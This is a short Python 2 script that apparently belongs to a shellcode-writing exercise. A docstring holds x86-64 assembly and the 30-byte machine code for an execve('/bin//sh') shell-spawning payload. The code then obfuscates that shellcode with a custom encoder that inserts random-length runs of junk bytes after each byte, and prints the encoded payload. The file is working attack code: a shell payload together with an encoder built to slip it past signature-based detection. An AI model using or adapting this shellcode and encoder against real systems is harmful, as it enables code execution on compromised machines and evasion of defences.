#!/usr/bin/python
from sys import exit
from random import randint
"""
global _start
section .text
_start:
    ;execve
    xor rax, rax
    push rax
	mov rbx, 0x68732f2f6e69622f ;/bin//sh in reverse
	push rbx
	mov rdi, rsp
	push rax
	mov rdx, rsp
	push rdi 
	mov rsi, rsp
	mov al, 0x3b
	syscall

30 bytes
unsigned char payload[] =\
    "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
"""

def get_random(ident):
    
    if ident == 'number':
        return randint(1,3)
    
    elif ident == 'char':
        return randint(65,122)#only [a-z[]\^_`A-Z]

shellcode  = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\xb0\x3b\x0f\x05")
encoded = ""
#end     = "\\xf0\\x0d"

for x in bytearray(shellcode):
    
    encoded += '\\x%02x' % x
    
    random = get_random('number')
    encoded += '\\x%02x' % random
    
    for i in range(random-1):
        
        encoded += '\\x%02x' % get_random('char')

#encoded += end #probably we will need it for correct jump

print encoded
print 
print encoded.replace("\\x", ",0x")[1:]

print 'Initial len: %d, encoded len: %d' % (len(shellcode), 
    len(encoded)/4)